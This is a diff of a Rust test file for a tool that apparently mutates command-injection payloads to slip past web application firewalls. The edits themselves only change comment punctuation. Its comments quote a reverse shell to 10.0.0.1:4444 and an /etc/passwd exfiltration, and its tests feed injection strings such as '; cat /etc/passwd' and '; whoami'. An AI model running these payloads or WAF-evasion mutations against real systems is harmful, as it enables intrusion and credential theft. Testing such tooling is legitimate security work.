@@ -2,19 +2,19 @@
 //! `xss_mutation_preserves_attack`.
 //!
 //! `cmd::mutate` correctly transforms the operator's real command in
-//! Strategies 1-6 — but its Priority-0 block also emitted FIVE canned
+//! Strategies 1-6, but its Priority-0 block also emitted FIVE canned
 //! bare RCE-confirmation probes (`whoami`, `id`, `hostname`,
 //! `uname${IFS}-a`, `/bin/sh${IFS}-c${IFS}id`) that REPLACE the
 //! payload, and silently rewrote `/etc/passwd` → `/etc/hostname`. So a
 //! reverse shell `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` "mutated"
-//! into `whoami` — a different, far weaker payload that pops no shell,
+//! into `whoami`: a different, far weaker payload that pops no shell,
 //! exactly the rig the de-rigged bench rejects. And the operator's
 //! `/etc/passwd` exfil could never be tested as-written.
 //!
 //! Proving side: a structured attack (reverse shell / download-exec /
 //! specific-file exfil) is NEVER replaced by a bare probe, and its
 //! target survives. Adversarial twin: a genuine bare `; whoami` probe
-//! STILL gets the equivalent `id`/`hostname` set — those really are
+//! STILL gets the equivalent `id`/`hostname` set, those really are
 //! semantically interchangeable there, so the gate must not kill them.
 
 use wafrift_grammar::grammar::cmd;
@@ -82,7 +82,7 @@ fn download_exec_and_file_exfil_keep_their_target() {
 #[test]
 fn passwd_target_is_offered_not_silently_rewritten() {
     // The pre-fix engine produced ONLY `/etc/hostname` IFS variants for
-    // a `/etc/passwd` read — so against a WAF without a passwd-filename
+    // a `/etc/passwd` read, so against a WAF without a passwd-filename
     // rule the operator's actual attack was never sent.
     let variants = cmd::mutate("; cat /etc/passwd", 64);
     assert!(
@@ -94,7 +94,7 @@ fn passwd_target_is_offered_not_silently_rewritten() {
 #[test]
 fn adversarial_twin_bare_probe_still_gets_equivalent_set() {
     // A genuine bare exec probe IS semantically interchangeable with
-    // the other bare probes — the gate must not lobotomise that.
+    // the other bare probes (the gate must not lobotomise that).
     for probe in ["; whoami", "; id"] {
         let variants = cmd::mutate(probe, 40);
         assert!(!variants.is_empty(), "no variants for bare probe {probe:?}");
@@ -102,7 +102,7 @@ fn adversarial_twin_bare_probe_still_gets_equivalent_set() {
             variants.iter().any(|v| v.payload == "id"
                 || v.payload == "hostname"
                 || v.payload.contains("uname")),
-            "bare probe {probe:?} lost its equivalent canned-probe set — gate too aggressive"
+            "bare probe {probe:?} lost its equivalent canned-probe set, gate too aggressive"
         );
     }
 }
